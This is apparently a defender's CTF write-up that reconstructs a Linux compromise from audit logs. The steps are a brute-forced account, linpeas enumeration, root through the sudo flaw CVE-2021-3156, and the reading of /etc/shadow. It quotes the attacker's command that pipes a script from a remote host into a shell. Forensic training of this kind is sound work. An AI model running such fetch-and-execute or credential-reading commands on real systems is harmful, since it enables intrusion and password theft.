**Paranoid**

I'm not paranoid, you are.


Challenge Submission

What account was compromised? 
I found this page on the internet talking about audit.log, it's quite useful.  

[Red Hat Audit Log Documentation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files)

<img width="1110" height="453" alt="image" src="https://github.com/user-attachments/assets/acc39bae-913c-43b2-be57-331c21aaa58d" />

type=USER_AUTH → This is the user authentication log.

acct="btlo" → The account the attacker tried to log in with is btlo.

This is the account that was compromised in the challenge.

What attack type was used to gain initial access?


<img width="1124" height="716" alt="image" src="https://github.com/user-attachments/assets/0a5b918a-493d-4454-833f-2e7c13253a93" />

We see a lot of login logs which means "brute force" was used.


What is the attacker's IP address?

<img width="1097" height="199" alt="image" src="https://github.com/user-attachments/assets/3c5f10d4-241c-48af-a984-8a969b205c55" />

 the attacker's IP address

What tool was used to perform system enumeration? 


<img width="1106" height="319" alt="image" src="https://github.com/user-attachments/assets/85520376-a4b4-4e78-9d52-178a2a3cfc65" />

Execution command:

wget -O - http://192.168.4.155:8000/linpeas.sh | sh
wget -O - URL → Download file from URL and output to stdout.

| sh → Pipe output of wget to shell, i.e. run script directly.

URL: http://192.168.4.155:8000/linpeas.sh → This is linpeas script, a Linux Privilege Escalation Enumeration Script tool.

User ID (auid=1001) → Normal user is executing this command.

Terminal (pts1) → Shell session is connected.


What is the name of the binary and pid used to gain root?

<img width="797" height="176" alt="image" src="https://github.com/user-attachments/assets/33f1ceb8-93fb-4efe-b85d-25986523aab2" />


Analyze each field
PID: 829992 → Process ID of the binary.

Binary: /home/btlo/evil/evil → This is the executable file (binary) used to gain root.

UID: 1001 → The running user is btlo.

GID/Session: other parameters, not necessary for the challenge answer.

Conclusion for the Challenge
Binary used to gain root: evil

PID of the binary: 829992


What CVE was exploited to gain root access? (Do your research!) 

<img width="1498" height="662" alt="image" src="https://github.com/user-attachments/assets/3035941b-1ce5-4730-9c2f-eed354fe4605" />

so that we have keyword "sudo CVE 2021 privilege escalation"

<img width="1662" height="642" alt="image" src="https://github.com/user-attachments/assets/83874308-aab5-4cb3-b6ce-b9200b338c4f" />

What type of vulnerability is this?

detail CVE in this page [link](https://nvd.nist.gov/vuln/detail/cve-2021-3156#:~:text=CVE%2D2021%2D3156%20Detail&text=Sudo%20before%201.9.,with%20a%20single%20backslash%20character.)

<img width="1478" height="459" alt="image" src="https://github.com/user-attachments/assets/6ed53424-6343-48a3-a795-4b3adef4555b" />



What file was exfiltrated once root was gained? 

<img width="936" height="603" alt="image" src="https://github.com/user-attachments/assets/149b5ba9-4ea0-43e3-9257-dab0fcfc696a" />

cat /etc/shadow


The cat /etc/shadow command is used to display the contents of the /etc/shadow file in a Linux system. This file contains information about user passwords, including encrypted passwords and password-related information such as change time, expiration time, etc. However, this file can only be read by the root user (superuser) due to the sensitive nature of the information contained in it.

